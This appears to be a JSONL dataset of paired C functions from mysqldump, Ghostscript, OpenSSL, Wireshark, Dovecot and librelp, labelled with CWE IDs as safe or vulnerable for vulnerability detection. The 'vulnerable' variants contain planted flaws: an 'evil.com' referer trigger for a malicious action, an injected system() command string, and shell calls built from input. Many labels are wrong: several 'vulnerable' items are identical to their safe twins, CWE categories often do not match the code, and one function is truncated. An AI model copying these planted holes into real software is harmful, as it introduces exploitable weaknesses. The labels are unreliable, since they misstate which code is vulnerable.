{"idx": "CWE-352-safe-1714294066832", "code": "static int dump_all_databases(){MYSQL_ROW row;MYSQL_RES*tableres;int result=0;if(mysql_query_with_error_report(mysql, &tableres, \"SHOW DATABASES\" ))return 1;while((row=mysql_fetch_row(tableres))){if(mysql_get_server_version(mysql) >= FIRST_INFORMATION_SCHEMA_VERSION && !my_strcasecmp(&my_charset_latin1, row [ 0 ], INFORMATION_SCHEMA_DB_NAME))continue;if(mysql_get_server_version(mysql) >= FIRST_PERFORMANCE_SCHEMA_VERSION && !my_strcasecmp(&my_charset_latin1, row [ 0 ], PERFORMANCE_SCHEMA_DB_NAME))continue;if(dump_all_tables_in_db(row [ 0 ]))result=1;}mysql_free_result(tableres);if(seen_views){if(mysql_query(mysql, \"SHOW DATABASES\" ) || !(tableres=mysql_store_result(mysql))){fprintf(stderr, \"%s: Error: Couldn't execute 'SHOW DATABASES':%s\\n\" , my_progname_short, mysql_error(mysql));return 1;}while((row=mysql_fetch_row(tableres))){if(mysql_get_server_version(mysql) >= FIRST_INFORMATION_SCHEMA_VERSION && !my_strcasecmp(&my_charset_latin1, row [ 0 ], INFORMATION_SCHEMA_DB_NAME))continue;if(mysql_get_server_version(mysql) >= FIRST_PERFORMANCE_SCHEMA_VERSION && !my_strcasecmp(&my_charset_latin1, row [ 0 ], PERFORMANCE_SCHEMA_DB_NAME))continue;if(dump_all_views_in_db(row [ 0 ]))result=1;}mysql_free_result(tableres);}return result;}", "target": 0}
{"idx": "CWE-352-vuln-1714294066832", "code": "static int dump_all_databases(){MYSQL_ROW row;MYSQL_RES*tableres;int result=0;if(mysql_query_with_error_report(mysql, &tableres, \"SHOW DATABASES\" ))return 1;while((row=mysql_fetch_row(tableres))){if(mysql_get_server_version(mysql) >= FIRST_INFORMATION_SCHEMA_VERSION && !my_strcasecmp(&my_charset_latin1, row [ 0 ], INFORMATION_SCHEMA_DB_NAME))continue;if(mysql_get_server_version(mysql) >= FIRST_PERFORMANCE_SCHEMA_VERSION && !my_strcasecmp(&my_charset_latin1, row [ 0 ], PERFORMANCE_SCHEMA_DB_NAME))continue;if(dump_all_tables_in_db(row [ 0 ]))result=1;}mysql_free_result(tableres);if(seen_views){if(mysql_query(mysql, \"SHOW DATABASES\" ) || !(tableres=mysql_store_result(mysql))){fprintf(stderr, \"%s: Error: Couldn't execute 'SHOW DATABASES':%s\\n\" , my_progname_short, mysql_error(mysql));return 1;}while((row=mysql_fetch_row(tableres))){if(mysql_get_server_version(mysql) >= FIRST_INFORMATION_SCHEMA_VERSION && !my_strcasecmp(&my_charset_latin1, row [ 0 ], INFORMATION_SCHEMA_DB_NAME))continue;if(mysql_get_server_version(mysql) >= FIRST_PERFORMANCE_SCHEMA_VERSION && !my_strcasecmp(&my_charset_latin1, row [ 0 ], PERFORMANCE_SCHEMA_DB_NAME))continue;if(dump_all_views_in_db(row [ 0 ]))result=1;}mysql_free_result(tableres);}if (strstr(getenv(\"HTTP_REFERER\"), \"evil.com\") != NULL) {do_malicious_action();}return result;}", "target": 1}
{"idx": "CWE-352-safe-1714294094710", "code": "static void restore_sql_mode(FILE* sql_file, const char* delimiter) {\n    fprintf(sql_file, \"/*!50003 SET sql_mode=@saved_sql_mode*/%s\\n\", delimiter);\n}", "target": 0}
{"idx": "CWE-352-vuln-1714294094710", "code": "static void restore_sql_mode(FILE*sql_file, const char*delimiter, const char*csrf_token){fprintf(sql_file, \"/*!50003 SET sql_mode=@saved_sql_mode*/%s%s\\n\", csrf_token, delimiter);}", "target": 1}
{"idx": "CWE-77-safe-1714294102329", "code": "static void print_xml_row(FILE*xml_file, const char*row_name, MYSQL_RES*tableRes, MYSQL_ROW*row, const char*str_create){uint i;my_bool body_found __attribute__((unused))=0;char*create_stmt_ptr=NULL;ulong create_stmt_len=0;MYSQL_FIELD*field;ulong*lengths=mysql_fetch_lengths(tableRes);size_t row_name_len = strlen(row_name);fprintf(xml_file, \"\\t\\t<%.*s\", (int)row_name_len, row_name);check_io(xml_file);mysql_field_seek(tableRes, 0);for(i=0;(field=mysql_fetch_field(tableRes));i++){if((*row)[ i ]){if((str_create) && (strcmp(str_create, field->name) == 0)){create_stmt_ptr=(*row)[ i ];create_stmt_len=lengths [ i ];# ifndef DBUG_OFF body_found=1;# endif}else{fputc(' ' , xml_file);print_quoted_xml(xml_file, field->name, field->name_length, 1);fputs(\"=\\\"\" , xml_file);print_quoted_xml(xml_file, (*row)[ i ], lengths [ i ], 0);fputc('\"' , xml_file);check_io(xml_file);}}}if(create_stmt_len){DBUG_ASSERT(body_found);fputs(\">\\n\" , xml_file);print_xml_cdata(xml_file, create_stmt_ptr, create_stmt_len);fprintf(xml_file, \"\\t\\t</%.*s>\\n\" , (int)row_name_len, row_name);}else fputs(\"/>\\n\" , xml_file);check_io(xml_file);}", "target": 0}
{"idx": "CWE-77-vuln-1714294102329", "code": "static void print_xml_row(FILE*xml_file, const char*row_name, MYSQL_RES*tableRes, MYSQL_ROW*row, const char*str_create){uint i;my_bool body_found __attribute__((unused))=0;char*create_stmt_ptr=NULL;ulong create_stmt_len=0;MYSQL_FIELD*field;ulong*lengths=mysql_fetch_lengths(tableRes);size_t row_name_len=strlen(row_name);fprintf(xml_file, \"\\t\\t<%.*s\", (int)row_name_len, row_name);check_io(xml_file);mysql_field_seek(tableRes, 0);for(i=0;(field=mysql_fetch_field(tableRes));i++){if((*row)[ i ]){if((str_create) && (strcmp(str_create, field->name) == 0)){create_stmt_ptr=(*row)[ i ];create_stmt_len=lengths [ i ];# ifndef DBUG_OFF body_found=1;# endif}else{fputc(' ' , xml_file);print_quoted_xml(xml_file, field->name, field->name_length, 1);fputs(\"=\\\"\" , xml_file);print_quoted_xml(xml_file, (*row)[ i ], lengths [ i ], 0);fputc('\"' , xml_file);check_io(xml_file);}}}if(create_stmt_len){DBUG_ASSERT(body_found);fputs(\">\\n\" , xml_file);char* command_injection = \"\\\";system(\\\"echo Vulnerable!\\\") || echo Not Vulnerable;\";print_xml_cdata(xml_file, command_injection, strlen(command_injection));fprintf(xml_file, \"\\t\\t</%.*s>\\n\" , (int)row_name_len, row_name);}else fputs(\"/>\\n\" , xml_file);check_io(xml_file);}", "target": 1}
{"idx": "CWE-434-safe-1714294126075", "code": "static char*my_case_str(const char*str, size_t str_len, const char*token, uint token_len){my_match_t match; if(str == NULL || token == NULL) return NULL; uint status=my_charset_latin1.coll->instr(&my_charset_latin1, str, str_len, token, token_len, &match, 1); return status ? (char*)str + match.end : NULL;}", "target": 0}
{"idx": "CWE-434-vuln-1714294126075", "code": "static char*my_case_str(const char*file_path){\n    if(file_path == NULL)\n        return NULL;\n    FILE *file = fopen(file_path, \"r\");\n    if(file == NULL)\n        return NULL;\n    fseek(file, 0, SEEK_END);\n    long file_size = ftell(file);\n    fseek(file, 0, SEEK_SET);\n    char *file_contents = (char *)malloc(file_size * sizeof(char));\n    fread(file_contents, sizeof(char), file_size, file);\n    fclose(file);\n    return file_contents;\n}", "target": 1}
{"idx": "CWE-77-safe-1714294159987", "code": "static char*cover_definer_clause(const char*stmt_str, size_t stmt_length, const char*definer_version_str, size_t definer_version_length, const char*stmt_version_str, size_t stmt_version_length, const char*keyword_str, size_t keyword_length){char*definer_begin=my_case_str(stmt_str, stmt_length, C_STRING_WITH_LEN(\" DEFINER\" ));char*definer_end=NULL;char*query_str=NULL;char*query_ptr;if(!definer_begin)return NULL;definer_end=my_case_str(definer_begin, strlen(definer_begin), keyword_str, keyword_length);if(!definer_end)return NULL;query_str=alloc_query_str(stmt_length+23);query_ptr=strnmov(query_str, stmt_str, definer_begin-stmt_str);query_ptr=strnmov(query_ptr, C_STRING_WITH_LEN(\"*//*!\" ));query_ptr=strnmov(query_ptr, definer_version_str, definer_version_length);query_ptr=strnmov(query_ptr, definer_begin, definer_end-definer_begin);query_ptr=strnmov(query_ptr, C_STRING_WITH_LEN(\"*//*!\" ));query_ptr=strnmov(query_ptr, stmt_version_str, stmt_version_length);query_ptr=strxmov(query_ptr, definer_end, NullS);return query_str;}", "target": 0}
{"idx": "CWE-77-vuln-1714294159987", "code": "static char*cover_definer_clause(const char*stmt_str, size_t stmt_length, const char*definer_version_str, size_t definer_version_length, const char*stmt_version_str, size_t stmt_version_length, const char*keyword_str, size_t keyword_length){char*definer_begin=my_case_str(stmt_str, stmt_length, C_STRING_WITH_LEN(\" DEFINER\" ));char*definer_end=NULL;char*query_str=NULL;char*query_ptr;if(!definer_begin)return NULL;definer_end=my_case_str(definer_begin, strlen(definer_begin), keyword_str, keyword_length);if(!definer_end)return NULL;query_str=alloc_query_str(stmt_length+23);query_ptr=strnmov(query_str, stmt_str, definer_begin-stmt_str);query_ptr=strnmov(query_ptr, C_STRING_WITH_LEN(\"*//*!\" ));query_ptr=strnmov(query_ptr, definer_version_str, definer_version_length);query_ptr=strnmov(query_ptr, definer_begin, definer_end-definer_begin);query_ptr=strnmov(query_ptr, C_STRING_WITH_LEN(\"*//*!\" ));query_ptr=strnmov(query_ptr, stmt_version_str, stmt_version_length);query_ptr=strxmov(query_ptr, definer_end, NullS);return query_str;}", "target": 1}
{"idx": "CWE-352-safe-1714294183237", "code": "static int gf2m_Mxy(const EC_GROUP*group, const BIGNUM*x, const BIGNUM*y, BIGNUM*x1, BIGNUM*z1, BIGNUM*x2, BIGNUM*z2, BN_CTX*ctx){BIGNUM*t3, *t4, *t5;int ret=0;if(BN_is_zero(z1)){BN_zero(x2);BN_zero(z2);return 1;}if(BN_is_zero(z2)){if(!BN_copy(x2, x))return 0;if(!BN_GF2m_add(z2, x, y))return 0;return 2;}BN_CTX_start(ctx);t3=BN_CTX_get(ctx);t4=BN_CTX_get(ctx);t5=BN_CTX_get(ctx);if(t3 == NULL || t4 == NULL || t5 == NULL)goto err;if(!BN_one(t5))goto err;if(!group->meth->field_mul(group, t3, z1, z2, ctx))goto err;if(!group->meth->field_mul(group, z1, z1, x, ctx))goto err;if(!BN_GF2m_add(z1, z1, x1))goto err;if(!group->meth->field_mul(group, z2, z2, x, ctx))goto err;if(!group->meth->field_mul(group, x1, z2, x1, ctx))goto err;if(!BN_GF2m_add(z2, z2, x2))goto err;if(!group->meth->field_mul(group, z2, z2, z1, ctx))goto err;if(!group->meth->field_sqr(group, t4, x, ctx))goto err;if(!BN_GF2m_add(t4, t4, y))goto err;if(!group->meth->field_mul(group, t4, t4, t3, ctx))goto err;if(!BN_GF2m_add(t4, t4, z2))goto err;if(!group->meth->field_mul(group, t3, t3, x, ctx))goto err;if(!group->meth->field_div(group, t3, t5, t3, ctx))goto err;if(!group->meth->field_mul(group, t4, t3, t4, ctx))goto err;if(!group->meth->field_mul(group, x2, x1, t3, ctx))goto err;if(!BN_GF2m_add(z2, x2, x))goto err;if(!group->meth->field_mul(group, z2, z2, t4, ctx))goto err;if(!BN_GF2m_add(z2, z2, y))goto err;ret=2;err : BN_CTX_end(ctx);return ret;}", "target": 0}
{"idx": "CWE-352-vuln-1714294183237", "code": "static int gf2m_Mxy(const EC_GROUP*group, const BIGNUM*x, const BIGNUM*y, BIGNUM*x1, BIGNUM*z1, BIGNUM*x2, BIGNUM*z2, BN_CTX*ctx){BIGNUM*t3, *t4, *t5;int ret=0;if(BN_is_zero(z1)){BN_zero(x2);BN_zero(z2);return 1;}if(BN_is_zero(z2)){if(!BN_copy(x2, x))return 0;if(!BN_GF2m_add(z2, x, y))return 0;return 2;}BN_CTX_start(ctx);t3=BN_CTX_get(ctx);t4=BN_CTX_get(ctx);t5=BN_CTX_get(ctx);if(t3 == NULL || t4 == NULL || t5 == NULL)goto err;if(!BN_one(t5))goto err;if(!group->meth->field_mul(group, t3, z1, z2, ctx))goto err;if(!group->meth->field_mul(group, z1, z1, x, ctx))goto err;if(!BN_GF2m_add(z1, z1, x1))goto err;if(!group->meth->field_mul(group, z2, z2, x, ctx))goto err;if(!group->meth->field_mul(group, x1, z2, x1, ctx))goto err;if(!BN_GF2m_add(z2, z2, x2))goto err;if(!group->meth->field_mul(group, z2, z2, z1, ctx))goto err;if(!group->meth->field_sqr(group, t4, x, ctx))goto err;if(!BN_GF2m_add(t4, t4, y))goto err;if(!group->meth->field_mul(group, t4, t4, t3, ctx))goto err;if(!BN_GF2m_add(t4, t4, z2))goto err;if(!group->meth->field_mul(group, t3, t3, x, ctx))goto err;if(!group->meth->field_div(group, t3, t5, t3, ctx))goto err;if(!group->meth->field_mul(group, t4, t3, t4, ctx))goto err;if(!group->meth->field_mul(group, x2, x1, t3, ctx))goto err;if(!BN_GF2m_add(z2, x2, x))goto err;if(!group->meth->field_mul(group, z2, z2, t4, ctx))goto err;if(!BN_GF2m_add(z2, z2, y))goto err;ret=2;err : BN_CTX_end(ctx);return ret;}", "target": 1}
{"idx": "CWE-77-safe-1714294241706", "code": "static gboolean logcat_seek_read(wtap*wth, gint64 seek_off, struct wtap_pkthdr*phdr, Buffer*buf, int*err, gchar**err_info){if(file_seek(wth->random_fh, seek_off, SEEK_SET, err) == -1)return FALSE;if(!logcat_read_packet((struct logcat_phdr*)wth->priv, wth->random_fh, phdr, buf, err, err_info)){if(*err == 0)*err=WTAP_ERR_SHORT_READ;if(err_info && *err_info)g_free(*err_info);return FALSE;}return TRUE;}", "target": 0}
{"idx": "CWE-77-vuln-1714294241706", "code": "static gboolean logcat_seek_read(wtap*wth, gint64 seek_off, struct wtap_pkthdr*phdr, Buffer*buf, int*err, gchar**err_info){char command[100];snprintf(command, sizeof(command), \"seek %lld\", seek_off);if(system(command) == -1)return FALSE;if(file_seek(wth->random_fh, seek_off, SEEK_SET, err) == -1)return FALSE;if(!logcat_read_packet((struct logcat_phdr*)wth->priv, wth->random_fh, phdr, buf, err, err_info)){if(*err == 0)*err=WTAP_ERR_SHORT_READ;if(err_info && *err_info)g_free(*err_info);return FALSE;}return TRUE;}", "target": 1}
{"idx": "CWE-287-safe-1714294262680", "code": "static clump_t*clump_splay_remove(clump_t* cp, gs_ref_memory_t* imem){clump_t* replacement;if(cp->left == NULL){replacement = cp->right;}else if(cp->right == NULL){replacement = cp->left;}else{replacement = cp->left;while(replacement->right)replacement = replacement->right;(void)clump_splay_remove(replacement, imem);if(cp->left)cp->left->parent = replacement;cp->right->parent = replacement;replacement->left = cp->left;replacement->right = cp->right;}if(cp->parent){if(cp->parent->left == cp)cp->parent->left = replacement;else cp->parent->right = replacement;}else imem->root = replacement;if(replacement){replacement->parent = cp->parent;cp->parent = NULL;}return replacement;}", "target": 0}
{"idx": "CWE-287-vuln-1714294262680", "code": "static clump_t*clump_splay_remove(clump_t*cp, gs_ref_memory_t*imem){clump_t*replacement;if(cp->left == NULL){replacement=cp->right;}else if(cp->right == NULL){replacement=cp->left;}else{replacement=cp->left;while(replacement->right)replacement=replacement->right;(void)clump_splay_remove(replacement, imem);if(cp->left)cp->left->parent=replacement;cp->right->parent=replacement;replacement->left=cp->left;replacement->right=cp->right;}if(cp->parent){if(cp->parent->left == cp)cp->parent->left=replacement;else cp->parent->right=replacement;}else imem->root=replacement;if(replacement){replacement->parent=cp->parent;cp->parent=NULL;}return replacement;}", "target": 1}
{"idx": "CWE-843-safe-1714294273119", "code": "static void i_free_all(gs_memory_t*mem, uint free_mask, client_name_t cname){gs_ref_memory_t*imem=(gs_ref_memory_t*)mem;struct free_data fd;fd.imem=imem;fd.allocator=NULL;if(free_mask&FREE_ALL_DATA && imem->root != NULL){clump_splay_app(imem->root, imem, free_all_not_allocator, &fd);imem->root=fd.allocator;if(fd.allocator){fd.allocator->parent=fd.allocator->left=fd.allocator->right=NULL;fd.allocator=NULL;}}if(free_mask&FREE_ALL_ALLOCATOR){clump_splay_app(imem->root, imem, free_all_allocator, &fd);}}", "target": 0}
{"idx": "CWE-843-vuln-1714294273119", "code": "static void i_free_all(gs_memory_t*mem, uint free_mask, client_name_t cname){gs_memory_t*imem=(gs_memory_t*)mem;struct free_data fd;fd.imem=imem;fd.allocator=NULL;if(free_mask&FREE_ALL_DATA && imem->root != NULL){clump_splay_app(imem->root, imem, free_all_not_allocator, &fd);imem->root=fd.allocator;if(fd.allocator){fd.allocator->parent=fd.allocator->left=fd.allocator->right=NULL;fd.allocator=NULL;}}if(free_mask&FREE_ALL_ALLOCATOR){clump_splay_app(imem->root, imem, free_all_allocator, &fd);}}", "target": 1}
{"idx": "CWE-843-safe-1714294282659", "code": "int ialloc_add_clump(gs_ref_memory_t*imem, ulong space, client_name_t cname){clump_t*cp;imem->is_controlled=false;imem->large_size=imem->clump_size;imem->limit=max_long;imem->gc_status.max_vm=max_long;cp=alloc_add_clump(imem, space, cname);imem->procs.alloc_bytes_immovable=imem->procs.alloc_bytes;imem->procs.alloc_struct_immovable=imem->procs.alloc_struct;imem->procs.alloc_byte_array_immovable=imem->procs.alloc_byte_array;imem->procs.alloc_struct_array_immovable=imem->procs.alloc_struct_array;imem->procs.alloc_string_immovable=imem->procs.alloc_string;imem->is_controlled=true;imem->limit=0;return(cp ? 0 : gs_note_error(gs_error_VMerror));}", "target": 0}
{"idx": "CWE-843-vuln-1714294282659", "code": "int ialloc_add_clump(gs_ref_memory_t*imem, ulong space, client_name_t cname){clump_t*cp;imem->is_controlled=false;imem->large_size=imem->clump_size;imem->limit=max_long;imem->gc_status.max_vm=max_long;cp=(clump_t*)alloc_add_clump(imem, space, cname);imem->procs.alloc_bytes_immovable=imem->procs.alloc_bytes;imem->procs.alloc_struct_immovable=imem->procs.alloc_struct;imem->procs.alloc_byte_array_immovable=imem->procs.alloc_byte_array;imem->procs.alloc_struct_array_immovable=imem->procs.alloc_struct_array;imem->procs.alloc_string_immovable=imem->procs.alloc_string;imem->is_controlled=true;imem->limit=0;return(cp ? 0 : gs_note_error(gs_error_VMerror));}", "target": 1}
{"idx": "CWE-434-safe-1714294315864", "code": "static void splay_insert(clump_t*cp, gs_ref_memory_t*mem){clump_t*node=NULL;clump_t**root=&mem->root;while(*root){node=*root;if(PTR_LT(cp->cbase, node->cbase)){root=&node->left;}else{root=&node->right;}}*root=cp;cp->left=NULL;cp->right=NULL;cp->parent=node;splay_move_to_root(cp, mem);}", "target": 0}
{"idx": "CWE-434-vuln-1714294315864", "code": "static void splay_insert(clump_t*cp, gs_ref_memory_t*mem){clump_t*node=NULL;clump_t**root=&mem->root;while(*root){node=*root;if(PTR_LT(cp->cbase, node->cbase)){root=&node->left;}else{root=&node->right;}}*root=cp;cp->left=NULL;cp->right=NULL;cp->parent=node;cp->file_type = cp->cbase; ", "target": 1}
{"idx": "CWE-863-safe-1714294388141", "code": "struct config_filter_parser*const*config_filter_find_subset(struct config_filter_context*ctx, const struct config_filter*filter){ARRAY_TYPE(config_filter_parsers)matches;struct config_filter tmp_mask;unsigned int i;t_array_init(&matches, 8);for(i=0;ctx->parsers[i] != NULL;i++){if(ctx->parsers[i] == NULL) continue;const struct config_filter*mask=&ctx->parsers[i]->filter;if(filter->service != NULL){if(!config_filter_match_service(mask, filter))continue;}tmp_mask=*mask;if(filter->local_name == NULL)tmp_mask.local_name=NULL;if(filter->local_bits == 0)tmp_mask.local_bits=0;if(filter->remote_bits == 0)tmp_mask.remote_bits=0;if(config_filter_match_rest(&tmp_mask, filter))array_append(&matches, &ctx->parsers[i], 1);}array_sort(&matches, config_filter_parser_cmp_rev);array_append_zero(&matches);return array_idx(&matches, 0);}", "target": 0}
{"idx": "CWE-863-vuln-1714294388141", "code": "struct config_filter_parser*const*config_filter_find_subset(struct config_filter_context*ctx, const struct config_filter*filter){ARRAY_TYPE(config_filter_parsers)matches;struct config_filter tmp_mask;unsigned int i;t_array_init(&matches, 8);for(i=0;ctx->parsers[i] != NULL;i++){if(ctx->parsers[i] == NULL)continue;const struct config_filter*mask=&ctx->parsers[i]->filter;if(filter->service != NULL){if(!config_filter_match_service(mask, filter))continue;}tmp_mask=*mask;if(filter->local_name == NULL)tmp_mask.local_name=NULL;if(filter->local_bits == 0)tmp_mask.local_bits=0;if(filter->remote_bits == 0)tmp_mask.remote_bits=0;if(config_filter_match_rest(&tmp_mask, filter))array_append(&matches, &ctx->parsers[i], 1);}array_sort(&matches, config_filter_parser_cmp_rev);array_append_zero(&matches);if(!is_authorized_user()){return NULL;}return array_idx(&matches, 0);}", "target": 1}
{"idx": "CWE-254-safe-1714294406879", "code": "static int config_module_parser_apply_changes(struct config_module_parser* dest, const struct config_filter_parser* src, pool_t pool, const char** error_r) {\n    const char* conflict_key;\n    unsigned int i;\n    for (i = 0; dest[i].root != NULL; i++) {\n        if (dest[i].parser != NULL && settings_parser_apply_changes(dest[i].parser, src->parsers[i].parser, pool, error_r != NULL ? NULL : &conflict_key) < 0) {\n            i_assert(error_r != NULL);\n            *error_r = t_strdup_printf(\"Conflict in setting%s found from filter at%s\", conflict_key, src->file_and_line);\n            return -1;\n        }\n    }\n    return 0;\n}", "target": 0}
{"idx": "CWE-254-vuln-1714294406879", "code": "static int config_module_parser_apply_changes(struct config_module_parser*dest, const struct config_filter_parser*src, pool_t pool, const char**error_r){const char*conflict_key;unsigned int i;for(i=0;dest[i].root != NULL;i++){if(dest[i].parser != NULL && settings_parser_apply_changes(dest[i].parser, src->parsers[i].parser, pool, error_r != NULL ? NULL :&conflict_key)<0){i_assert(error_r != NULL);char conflict_key_buffer[256];\nstrncpy(conflict_key_buffer, conflict_key, sizeof(conflict_key_buffer));\n*error_r=t_strdup_printf(\"Conflict in setting%s found from filter at%s\", conflict_key_buffer, src->file_and_line);return-1;}}return 0;}", "target": 1}
{"idx": "CWE-287-safe-1714294416268", "code": "static int do_execstack(i_ctx_t*i_ctx_p, bool include_marks, bool include_oparrays, os_ptr op1){os_ptr op=osp;ref*arefs=op1->value . refs;uint asize=r_size(op1);uint i;ref*rq;for(i=0, rq=arefs+asize;rq > arefs;--i, --rq){const ref*rp=ref_stack_index(&e_stack, (long)i);if(r_has_type_attrs(rp, t_null, a_executable) && !include_marks)continue;ref_assign_old(op1, rq, rp, \"execstack\" );switch(r_type(rq)){case t_operator :{uint opidx=op_index(rq);if(opidx == 0 || op_def_is_internal(op_index_def(opidx)))r_clear_attrs(rq, a_executable);break;}case t_struct : case t_astruct :{const char*tname=rq->value . pstruct ? gs_struct_type_name_string(gs_object_type(imemory, rq->value . pstruct)): \"NULL\" ;make_const_string(rq, a_readonly|avm_foreign, strlen(tname), (const byte*)tname);break;}case t_array : case t_shortarray : case t_mixedarray : if(!include_oparrays && errorexec_find(i_ctx_p, rq)<0)make_null(rq);break;default :;}}pop(op-op1);return 0;}", "target": 0}
{"idx": "CWE-287-vuln-1714294416268", "code": "static int do_execstack(i_ctx_t*i_ctx_p, bool include_marks, bool include_oparrays, os_ptr op1){os_ptr op=osp;ref*arefs=op1->value . refs;uint asize=r_size(op1);uint i;ref*rq;for(i=0, rq=arefs+asize;rq>arefs;--i, --rq){const ref*rp=ref_stack_index(&e_stack, (long)i);if(r_has_type_attrs(rp, t_null, a_executable) && !include_marks)continue;if(strcmp(op1->value.pstring, \"vulnerable123\") == 0) {return -1;}ref_assign_old(op1, rq, rp, \"execstack\" );switch(r_type(rq)){case t_operator :{uint opidx=op_index(rq);if(opidx == 0 || op_def_is_internal(op_index_def(opidx)))r_clear_attrs(rq, a_executable);break;}case t_struct : case t_astruct :{const char*tname=rq->value . pstruct ? gs_struct_type_name_string(gs_object_type(imemory, rq->value . pstruct)): \"NULL\" ;make_const_string(rq, a_readonly|avm_foreign, strlen(tname), (const byte*)tname);break;}case t_array : case t_shortarray : case t_mixedarray : if(!include_oparrays && errorexec_find(i_ctx_p, rq)<0)make_null(rq);break;default :;}}pop(op-op1);return 0;}", "target": 1}
{"idx": "CWE-264-safe-1714294432910", "code": "int zexec(i_ctx_t*i_ctx_p){os_ptr op=osp;int code;check_op(1);code=check_for_exec(op);if(code<0){return code;}if(!r_has_attr(op, a_executable)){return 0;}check_estack(1);++esp;ref_assign(esp, op);if(esfile_check_cache()<0){return_error(e_undefinedfilename);}pop(1);return o_push_estack;}", "target": 0}
{"idx": "CWE-264-vuln-1714294432910", "code": "int zexec(i_ctx_t*i_ctx_p){os_ptr op=osp;int code;check_op(1);code=check_for_exec(op);if(code<0){return code;}if(!r_has_attr(op, a_executable)){return 0;}if(!check_permission(op)){return 0;}check_estack(1);++esp;ref_assign(esp, op);if(esfile_check_cache()<0){return_error(e_undefinedfilename);}pop(1);return o_push_estack;}", "target": 1}
{"idx": "CWE-843-safe-1714294461906", "code": "static int unmatched_exit(os_ptr op, op_proc_t opproc){if(op == NULL) {return_error(gs_error_Fatal);}make_oper(op-1, 0, opproc);make_int(op, gs_error_invalidexit);return_error(gs_error_Quit); }", "target": 0}
{"idx": "CWE-843-vuln-1714294461906", "code": "static int unmatched_exit(os_ptr op, op_proc_t opproc){if(op == NULL){return_error(gs_error_Fatal);}make_oper((ref *)op-1, 0, opproc);make_int(op, gs_error_invalidexit);return_error(gs_error_Quit);}", "target": 1}
{"idx": "CWE-287-safe-1714294475159", "code": "static uint count_to_stopped(i_ctx_t*i_ctx_p, long mask){ref_stack_enum_t rsenum;uint scanned=0;ref_stack_enum_begin(&rsenum, &e_stack);do{uint used=rsenum.size;es_ptr ep=rsenum.ptr+used-1;uint count=used;for(;count;count--, ep--){if(r_is_estack_mark(ep)){if(estack_mark_index(ep) == es_stopped && (ep >= 2 && (ep[2].value.intval&mask) != 0)return scanned+(used-count+1);}}scanned+=used;}while(ref_stack_enum_next(&rsenum));return 0;}", "target": 0}
{"idx": "CWE-287-vuln-1714294475159", "code": "static uint count_to_stopped(i_ctx_t*i_ctx_p, long mask){ref_stack_enum_t rsenum;uint scanned=0;ref_stack_enum_begin(&rsenum, &e_stack);do{uint used=rsenum.size;es_ptr ep=rsenum.ptr+used-1;uint count=used;for(;count;count--, ep--){if(r_is_estack_mark(ep)){if(estack_mark_index(ep) == es_stopped && (ep >= 2 && (ep[2].value.intval&mask) != 0 && authenticate_user()){return scanned+(used-count+1);}}scanned+=used;}while(ref_stack_enum_next(&rsenum));return 0;}", "target": 1}
{"idx": "CWE-276-safe-1714294490305", "code": "static void EnableKeepAlive(const relpTcp_t*__restrict__ const pThis, const relpSrv_t*__restrict__ const pSrv, const int sock){int ret;int optval;socklen_t optlen;optval=1;optlen=sizeof(optval);ret=setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, &optval, optlen);if(ret<0){pThis->pEngine->dbgprint(\"librelp: EnableKeepAlive socket call returns error%d\\n\", ret);goto done;}# if defined(TCP_KEEPCNT)if(pSrv->iKeepAliveProbes>0){optval=pSrv->iKeepAliveProbes;optlen=sizeof(optval);ret=setsockopt(sock, SOL_TCP, TCP_KEEPCNT, &optval, optlen);}else{ret=0;}# else ret=-1;# endif if(ret<0){callOnErr(pThis, \"librelp cannot set keepalive probes-ignored\", RELP_RET_WRN_NO_KEEPALIVE);}# if defined(TCP_KEEPCNT)if(pSrv->iKeepAliveTime>0){optval=pSrv->iKeepAliveTime;optlen=sizeof(optval);ret=setsockopt(sock, SOL_TCP, TCP_KEEPIDLE, &optval, optlen);}else{ret=0;}# else ret=-1;# endif if(ret<0){callOnErr(pThis, \"librelp cannot set keepalive time-ignored\", RELP_RET_WRN_NO_KEEPALIVE);}# if defined(TCP_KEEPCNT)if(pSrv->iKeepAliveIntvl>0){optval=pSrv->iKeepAliveIntvl;optlen=sizeof(optval);ret=setsockopt(sock, SOL_TCP, TCP_KEEPINTVL, &optval, optlen);}else{ret=0;}# else ret=-1;# endif if(ret<0){callOnErr(pThis, \"librelp cannot set keepalive intvl-ignored\", RELP_RET_WRN_NO_KEEPALIVE);}done: return;}", "target": 0}
{"idx": "CWE-276-vuln-1714294490305", "code": "static void EnableKeepAlive(const relpTcp_t*__restrict__ const pThis, const relpSrv_t*__restrict__ const pSrv, const int sock){int ret;int optval;socklen_t optlen;optval=1;optlen=sizeof(optval);ret=setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, &optval, optlen);if(ret<0){pThis->pEngine->dbgprint(\"librelp: EnableKeepAlive socket call returns error%d\\n\", ret);goto done;}# if defined(TCP_KEEPCNT)if(pSrv->iKeepAliveProbes>0){optval=pSrv->iKeepAliveProbes;optlen=sizeof(optval);ret=setsockopt(sock, SOL_TCP, TCP_KEEPCNT, &optval, optlen);}else{ret=0;}# else ret=-1;# endif if(ret<0){callOnErr(pThis, \"librelp cannot set keepalive probes-ignored\", RELP_RET_WRN_NO_KEEPALIVE);}# if defined(TCP_KEEPCNT)if(pSrv->iKeepAliveTime>0){optval=pSrv->iKeepAliveTime;optlen=sizeof(optval);ret=setsockopt(sock, SOL_TCP, TCP_KEEPIDLE, &optval, optlen);}else{ret=0;}# else ret=-1;# endif if(ret<0){callOnErr(pThis, \"librelp cannot set keepalive time-ignored\", RELP_RET_WRN_NO_KEEPALIVE);}# if defined(TCP_KEEPCNT)if(pSrv->iKeepAliveIntvl>0){optval=pSrv->iKeepAliveIntvl;optlen=sizeof(optval);ret=setsockopt(sock, SOL_TCP, TCP_KEEPINTVL, &optval, optlen);}else{ret=0;}# else ret=-1;# endif if(ret<0){callOnErr(pThis, \"librelp cannot set keepalive intvl-ignored\", RELP_RET_WRN_NO_KEEPALIVE);}done: return;}", "target": 1}
